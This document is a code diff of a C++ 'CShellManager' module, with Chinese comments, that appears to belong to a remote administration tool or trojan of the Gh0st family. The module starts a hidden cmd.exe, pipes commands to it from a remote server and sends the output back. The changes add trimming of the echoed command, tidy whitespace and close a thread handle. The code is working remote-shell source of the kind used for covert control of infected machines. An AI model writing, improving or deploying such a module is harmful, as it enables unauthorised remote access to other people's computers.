@@ -16,14 +16,15 @@ BOOL bStarting = TRUE;
 
 CShellManager::CShellManager(IOCPClient* ClientObject, int n):CManager(ClientObject)
 {
+	m_nCmdLength = 0;
 	bStarting = TRUE;
 	m_hThreadRead = NULL;
 	m_hShellProcessHandle   = NULL;    //保存Cmd进程的进程句柄和主线程句柄
 	m_hShellThreadHandle	= NULL;
-	SECURITY_ATTRIBUTES  sa = {0}; 	
+	SECURITY_ATTRIBUTES  sa = {0};
 	sa.nLength = sizeof(sa);
-    sa.lpSecurityDescriptor = NULL; 
-    sa.bInheritHandle = TRUE;     //重要
+	sa.lpSecurityDescriptor = NULL;
+	sa.bInheritHandle = TRUE;     //重要
 	m_hReadPipeHandle	= NULL;   //client
 	m_hWritePipeHandle	= NULL;   //client
 	m_hReadPipeShell	= NULL;   //cmd
@@ -40,9 +41,9 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n):CManager(ClientObj
 			CloseHandle(m_hWritePipeShell);
 		}
 		return;
-    }
-	
-    if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0)) 
+	}
+
+	if(!CreatePipe(&m_hReadPipeShell, &m_hWritePipeHandle, &sa, 0))
 	{
 		if(m_hWritePipeHandle != NULL)
 		{
@@ -53,10 +54,10 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n):CManager(ClientObj
 			CloseHandle(m_hReadPipeShell);
 		}
 		return;
-    }
+	}
 
 	//获得Cmd FullPath
-	char  strShellPath[MAX_PATH] = {0}; 	
+	char  strShellPath[MAX_PATH] = {0};
 	GetSystemDirectory(strShellPath, MAX_PATH);  //C:\windows\system32
 	//C:\windows\system32\cmd.exe
 	strcat(strShellPath,"\\cmd.exe");
@@ -68,19 +69,19 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n):CManager(ClientObj
 	PROCESS_INFORMATION  pi = {0};    //CreateProcess
 
 	memset((void *)&si, 0, sizeof(si));
-    memset((void *)&pi, 0, sizeof(pi));
+	memset((void *)&pi, 0, sizeof(pi));
 
 	si.cb = sizeof(STARTUPINFO);  //重要
-    
-    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
-    si.hStdInput  = m_hReadPipeShell;                           //将管道赋值
-    si.hStdOutput = si.hStdError = m_hWritePipeShell; 
+
+	si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+	si.hStdInput  = m_hReadPipeShell;                           //将管道赋值
+	si.hStdOutput = si.hStdError = m_hWritePipeShell; 
 
 	si.wShowWindow = SW_HIDE;
 
 	//启动Cmd进程
 	//3 继承
-	
+
 	if (!CreateProcess(strShellPath, NULL, NULL, NULL, TRUE, 
 		NORMAL_PRIORITY_CLASS, NULL, NULL, &si, &pi)) 
 	{
@@ -89,7 +90,7 @@ CShellManager::CShellManager(IOCPClient* ClientObject, int n):CManager(ClientObj
 		CloseHandle(m_hReadPipeShell);
 		CloseHandle(m_hWritePipeShell);
 		return;
-    }
+	}
 
 	m_hShellProcessHandle   = pi.hProcess;    //保存Cmd进程的进程句柄和主线程句柄
 	m_hShellThreadHandle	= pi.hThread;
@@ -124,9 +125,14 @@ DWORD WINAPI CShellManager::ReadPipeThread(LPVOID lParam)
 			//读取管道数据
 			ReadFile(This->m_hReadPipeHandle, 
 				szTotalBuffer, dwTotal, &dwReturn, NULL);
-		
-			This->m_ClientObject->OnServerSending((char*)szTotalBuffer, dwReturn);  
-	
+#ifdef _DEBUG
+			printf("===> Input length= %d \n", This->m_nCmdLength);
+#endif
+			const char *pStart = (char*)szTotalBuffer + This->m_nCmdLength;
+			int length = int(dwReturn) - This->m_nCmdLength;
+			if (length > 0)
+				This->m_ClientObject->OnServerSending(pStart, length);
+
 			LocalFree(szTotalBuffer);
 		}
 	}
@@ -140,31 +146,27 @@ VOID CShellManager::OnReceive(PBYTE szBuffer, ULONG ulLength)
 	{
 	case COMMAND_NEXT:
 		{			
-			NotifyDialogIsOpen();						
+			NotifyDialogIsOpen();
 			break;
-		}		
+		}
 	default:
-		{		
+		{
+			m_nCmdLength = (ulLength - 2);// 不含"\r\n"
 			unsigned long	dwReturn = 0;
-			if(WriteFile(m_hWritePipeHandle, szBuffer, ulLength, &dwReturn,NULL))
-			{			
-			}
-
+			WriteFile(m_hWritePipeHandle, szBuffer, ulLength, &dwReturn,NULL);
 			break;
 		}
 	}
 }
 
-
-
 CShellManager::~CShellManager()
 {
 	bStarting = FALSE;
-	
+
 	TerminateProcess(m_hShellProcessHandle, 0);   //结束我们自己创建的Cmd进程
 	TerminateThread(m_hShellThreadHandle, 0);     //结束我们自己创建的Cmd线程
 	Sleep(100);
-	
+
 	if (m_hReadPipeHandle != NULL)
 	{
 		DisconnectNamedPipe(m_hReadPipeHandle);
@@ -174,8 +176,8 @@ CShellManager::~CShellManager()
 	if (m_hWritePipeHandle != NULL)
 	{
 		DisconnectNamedPipe(m_hWritePipeHandle);
-	   CloseHandle(m_hWritePipeHandle);
-	   m_hWritePipeHandle = NULL;
+		CloseHandle(m_hWritePipeHandle);
+		m_hWritePipeHandle = NULL;
 	}
 	if (m_hReadPipeShell != NULL)
 	{
@@ -186,7 +188,12 @@ CShellManager::~CShellManager()
 	if (m_hWritePipeShell != NULL)
 	{
 		DisconnectNamedPipe(m_hWritePipeShell);
-	   CloseHandle(m_hWritePipeShell);
-	   m_hWritePipeShell = NULL;  
+		CloseHandle(m_hWritePipeShell);
+		m_hWritePipeShell = NULL;  
+	}
+	if (m_hThreadRead)
+	{
+		CloseHandle(m_hThreadRead);
+		m_hThreadRead = NULL;
 	}
 }
